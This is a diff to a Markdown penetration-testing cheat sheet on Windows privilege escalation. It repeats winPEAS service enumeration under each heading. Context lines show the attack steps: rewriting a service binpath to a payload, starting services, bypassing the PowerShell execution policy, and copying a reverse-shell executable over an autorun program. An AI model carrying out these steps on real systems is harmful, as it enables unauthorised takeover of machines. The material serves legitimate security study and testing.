@@ -730,14 +730,12 @@ python wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only | less
 ##### Services
 
 ```ps1
-# Enumeration
-.\winPEASany.exe quiet servicesinfo
-
-
-
 #########################################################################
 #### 1. Insecure Service Properties #####################################
 #########################################################################
+
+# Winpeas Enumeration
+.\winPEASany.exe quiet servicesinfo
 
 # Verify permissions of a service using accesschk
 .\accesschk.exe /accepteula -uwcqv user {SERVICE}
@@ -754,10 +752,12 @@ config {SERVICE} binpath= "\"C:\{PAYLOAD PATH}\""
 # Start a service:
 net start {SERVICE}
 
-
 #########################################################################
 ##### 2. Unquoted Service Path ##########################################
 #########################################################################
+
+# Winpeas Enumeration
+.\winPEASany.exe quiet servicesinfo
 
 # Verify permissions of to start service using accesschk
 .\accesschk.exe /accepteula -uwcqv user {SERVICE}
@@ -776,6 +776,9 @@ net start {SERVICE}
 #########################################################################
 #### 3. Weak Registry Permissions #######################################
 #########################################################################
+
+# Winpeas Enumeration
+.\winPEASany.exe quiet servicesinfo
 
 # Check regsvc for weak entries using powershell
 powershell -exec bypass
@@ -802,6 +805,9 @@ net start regsvc
 ##### 4. Insecure Service Executables (File Permissions: Everyone) ######
 #########################################################################
 
+# Winpeas Enumeration
+.\winPEASany.exe quiet servicesinfo
+
 # Verify permissions of a service using accesschk
 .\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
 
@@ -817,6 +823,9 @@ net start filepermsvc
 #########################################################################
 #### 5. DLL Hijacking ###################################################
 #########################################################################
+
+# Winpeas Enumeration
+.\winPEASany.exe quiet servicesinfo
 
 # Verify permissions of to start service using accesschk
 .\accesschk.exe /accepteula -uvqc dllsvc
@@ -872,7 +881,6 @@ copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe"
 #########################################################################
 #### 2. AlwaysInstallElevated ###########################################
 #########################################################################
-
 
 # Winpeas Enumeration to see if both registry values are set
 .\winPEASany.exe quiet windowscreds
